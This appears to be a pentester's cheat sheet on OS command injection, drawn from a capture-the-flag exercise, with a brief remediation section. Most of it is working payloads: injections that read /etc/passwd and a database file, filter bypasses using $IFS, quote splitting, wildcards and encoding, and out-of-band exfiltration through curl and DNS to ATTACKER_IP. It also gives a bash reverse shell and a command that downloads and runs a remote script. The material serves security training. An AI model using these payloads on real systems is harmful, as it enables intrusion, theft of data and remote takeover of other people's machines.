# OS command injection

User input reaches a shell (`system()`, `exec`, backticks, `child_process` in
Node, etc.) without sanitisation, so you can append your own commands. Order of
work: **detect** it, **identify** what the filter blocks, then apply the
**minimum** bypass. Start simple; only escalate when something specific demands it.

Seen on UltraTech: a Node.js API `ping` endpoint concatenated its `ip` parameter
into a shell `ping`, giving injection via a backtick.

## Injecting a second command

```bash
;   command          # sequential (Linux)
&&  command          # run if the first succeeds
||  command          # run if the first fails
&   command          # background
|   command          # pipe into
%0a command          # newline (URL-encoded), often bypasses ; && filters
```

Inline / substitution (runs even mid-argument):

```bash
`command`
$(command)
```

So a `ping` field expecting `127.0.0.1` becomes:

```
127.0.0.1; id
127.0.0.1 && cat /etc/passwd
127.0.0.1`id`
$(cat utech.db.sqlite)
```

## Confirming blind injection (no output returned)

You cannot see stdout, so prove execution out-of-band.

**ICMP - listen with tcpdump, make the target ping you** (the UltraTech method):

```bash
sudo tcpdump -i tun0 icmp
# payload:  ; ping -c 1 ATTACKER_IP
```

**Time-based** - a delay that depends on a condition:

```bash
; sleep 5
if [ $(whoami|cut -c 1) == r ]; then sleep 5; fi
```

**DNS / HTTP out-of-band** - exfiltrate when even ICMP is blocked:

```bash
; for i in $(ls /) ; do host "$i.<your-collab-domain>"; done
; curl http://ATTACKER_IP/$(whoami)
; nslookup $(whoami).<your-collab-domain>
```

## Filter bypasses

### Blocked spaces

```bash
cat${IFS}/etc/passwd          # $IFS = internal field separator (defaults to whitespace)
{cat,/etc/passwd}             # brace expansion
cat</etc/passwd               # input redirection, no space needed
X=$'cat\x20/etc/passwd'&&$X   # ANSI-C quoting builds the space
;ls%09-la                     # %09 = tab (URL-encoded)
```

### Blocked characters / keywords

```bash
w'h'o'am'i                    # quote insertion, shell strips empty quotes
w"h"o"am"i
wh\o\am\i                     # backslash escaping
who$@ami                      # $@ expands to nothing
who$()ami                     # empty command substitution
who$(echo am)i                # splice a keyword together
/???/??t /???/p??s??          # wildcards -> /bin/cat /etc/passwd
```

### Encode the payload

```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"     # hex -> /etc/passwd
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
xxd -r -p <<< 2f6574632f706173737764                        # hex decode inline
echo cat /etc/passwd | base64        # then:  bash<<<$(base64 -d<<<Y2F0...)
```

### Windows notes

- Separators: `&`, `&&`, `|`, `||`. Newline works less often than on Linux.
- Case is insensitive for commands: `wHoAmI`.

## From injection to a shell

Once a command runs, upgrade:

```bash
# reverse shell (see reverse-shells.md), url-encode before sending
; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
# or write + fetch + run a payload
; curl http://ATTACKER_IP/s.sh -o /tmp/s.sh; bash /tmp/s.sh
```

## Remediation (for the report)

- Never pass user input to a shell. Use argument-array APIs
  (`execFile`/`spawn` with an args list, `subprocess.run([...], shell=False)`).
- Validate against a strict allowlist (e.g. an IP regex), do not blacklist chars.
- Drop privileges of the service; a hit should not already be root.

## References

- PayloadsAllTheThings - Command Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md
- HackTricks - Command Injection: https://book.hacktricks.xyz/pentesting-web/command-injection
- OWASP - Command Injection: https://owasp.org/www-community/attacks/Command_Injection
- PortSwigger - OS command injection: https://portswigger.net/web-security/os-command-injection
